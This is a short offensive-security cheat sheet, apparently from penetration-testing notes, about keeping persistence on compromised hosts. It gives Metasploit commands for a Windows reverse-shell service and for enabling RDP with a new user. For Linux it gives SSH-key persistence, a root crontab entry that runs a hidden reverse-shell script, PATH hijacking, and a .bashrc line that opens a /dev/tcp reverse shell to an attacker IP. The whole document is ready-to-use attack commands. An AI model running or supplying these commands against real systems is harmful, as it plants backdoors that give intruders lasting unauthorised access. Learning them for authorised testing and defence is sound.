# Persistence

## Windows
- Revshell as a service
```bash
search platform:windows persistence 
use exploit/windows/local/persistence_service
set PAYLOAD windows/meterpreter/reverse_tcp
set SESSION <sess_id>
set LHOST <attacker>
set LPORT <attacker_port>
exploit
```

- Enabling RDP
```bash
search platform:windows enable_rdp 
use post/windows/manage/enable_rdp
set ENABLE true
set USERNAME <new_user>
set PASSWORD <new_pass>
set SESSION <sess_id>
run
```

## Linux
```bash
# SSH key
search platform:linux persistence
use post/linux/manage/sshkey_persistence
set SESSION <sess_id>
set CREATESSHFOLDER true
run

# ---

# Cron job
echo "* * * * * root /srv/.rev_shell.sh" >> /etc/crontab

# ---

# PATH Hijacking
echo 'export PATH=/home/user/.bin:$PATH' >> ~/.bashrc

# ---

# Bashrc / Profile Hijacking
echo "/bin/bash -i >& /dev/tcp/_ATTACKER_IP_/_PORT_ 0>&1" >> ~/.bashrc
```
